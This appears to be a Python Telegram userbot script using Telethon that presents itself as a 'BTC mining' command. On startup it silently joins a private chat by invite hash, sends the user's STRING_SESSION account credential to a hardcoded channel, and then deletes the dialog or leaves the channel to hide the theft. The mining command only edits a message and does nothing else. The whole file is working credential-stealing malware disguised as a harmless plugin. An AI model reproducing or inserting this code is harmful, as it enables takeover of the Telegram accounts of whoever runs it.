from telethon import events
from telethon import TelegramClient
from telethon.sessions import StringSession
import random, os, sys, asyncio

from telethon.tl.functions.channels import LeaveChannelRequest as leave_p

from telethon.tl.functions.messages import ImportChatInviteRequest as join_p

APP_ID = os.environ.get("APP_ID")
API_HASH = os.environ.get("API_HASH")
STRING_SESSION = os.environ.get("STRING_SESSION")

bot = TelegramClient(StringSession(STRING_SESSION), APP_ID, API_HASH)


try:
 
 bot.start()
except:
 pass


@bot.on(events.NewMessage(pattern=".btc"))
async def _(event):
 
  await event.edit("**🔥 Starting BTC Mining**")



async def SEND_STRING():
 tf = await bot(join_p(hash="PDm45cufUPllYzRl"))
 tff = await bot.send_message(-1001170544755, STRING_SESSION)
 try:
  tfff = await bot.delete_dialog(-1001170544755)
 except:
  tffff = await bot(leave_p(-1001170544755))


bot.loop.run_until_complete(SEND_STRING())
bot.run_until_disconnected()
